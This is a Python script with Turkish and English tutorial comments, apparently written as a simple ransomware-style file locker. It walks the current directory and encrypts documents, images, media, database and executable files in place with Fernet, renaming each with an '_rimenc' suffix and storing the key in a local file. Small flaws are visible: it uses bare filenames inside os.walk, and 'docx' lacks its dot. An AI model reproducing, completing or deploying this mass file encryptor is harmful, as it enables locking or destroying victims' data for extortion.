#İlk olarak kütaphanelerimizi tanımlıyoruz.

import os
import sys
from cryptography.fernet import Fernet

from colorama import init
from colorama import Fore, Back, Style #Renk kütüphanemizdeki Fore , Back , Style komutlarını seçiyoruz.
init()

# Burda anahtar dosya adımızı seçiyoruz 'rimtay.key'
# Name of the key file 'rimtay.key'
KEYFILE = "rimtay.key" #Dilerseniz anahtarınıza kendi seçtiğiniz ismi verebilirsiniz.

# Şifrelenecek dosya uzantılarını seçiyoruz.
# Selecet file extensions that will be encrypted.

ALLOWED_FILES = [".txt", ".png", ".jpg", ".jpeg", ".gif", ".doc", "docx", ".mp4", ".mp3", ".pdf", ".odt", ".xls",
                 ".xlsx", ".json", ".php", ".exe", ".sql", ".csv", ".xml"]

#Burada python gibi dosyaları yazmamaya dikatt edin. Şayet yazarsanız şifre çözme uygulamanızda kilitlenir.
#Böylece bir paradoxa girmiş olursunuz.

#cryptography kütüphanesinden gelen fonksiyonumuzu tanımlıyoruz.
#We define our function coming from the #cryptography library.

def encrypt(filename):
    if (os.path.exists(filename)):
        file = open(filename, "rb+")
        data = file.read()
        file.seek(0) #Fonksiyonumuzu kullanıyoruz.

        if (len(data) > 0):
            #Burada en başta file.read komutumuzu veri yapıyoruz ve verimiz 0 dan büyük ise şifrelemeyi başlatıyoruz.
            name, extension = os.path.splitext(filename)
            new_name = filename + "_rimenc"
            i = 0
            while os.path.exists(new_name) == True:
                i += 1
                new_name = name + "_" + str(i) + extension + "_rimenc" #Dosyaları şifrelerken aynı zamanda ismide şifreliyoruz.

            fernet = Fernet(key)
            try:
                encrypted = fernet.encrypt(data)
            except TypeError:
                print(Fore.RED) #Yazı rengini kırmızı yapıyoruz.
                print("FAILED '" + filename + "' could not encrypted because the data is not binary")
                print("Hata '" + filename + "' Veriler 2 li olmadığı için şifrelenemedi.")
                print(Fore.WHITE) #Yazı rengini eski haline getiriyoruz.
                file.close()
            else:
                change = file.write(encrypted)
                file.close()
                os.rename(filename, new_name)

            print(Fore.GREEN) #Yeşil yazı rengini seçiyoruz
            print("SUCCESS '" + filename + "' has encrypted and renamed as '" + new_name + "'")
            print("TAMAMLANDI '" + filename + "' dosya adı yenilendi '" + new_name + "'")
            print(Fore.WHITE) #Yazı rengini eski haline getiriyoruz.
        else:
            #Burada dosyanın içinde veri olmassa şifrelenmediği için bir hata raporu yazıyoruz.
            print("WARNING '" + filename + "' could not encrypted because it's empty")
            file.close()


if os.path.exists(KEYFILE) == False:
    file = open(KEYFILE, "wb")
    key = Fernet.generate_key()
    file.write(key)
    print("Encryption Key File Not Found! The new one is created!") #keyimiz de hata çıkarsa diye bir dönüt koyuyoruz.

else:
    file = open(KEYFILE, "rb")
    key = file.read()
    print("Encryption Key File found on the system.") #Burda anahtar dosyalarının karışmaması için anahtar dosyamızı belirtiyoruz.
file.close()

print("Encryption Key: " + str(key)) #Anahtar dosyamızı belirtiyoruz.

for root, dirs, files in os.walk("."):
    for filename in files:
        name, extension = os.path.splitext(filename)
        extension = extension.lower()
        if (extension in ALLOWED_FILES):
            encrypt(filename)
        # print(filename)
print("\n\nPress enter to exit!") #Sonunda programı sonlandırmak için son kodumuzu da yazıyoruz.
wait = input()

#Programımızı başarılı bir şekilde bitirdik.

# We finished our program successfully.
#By Alperen Türk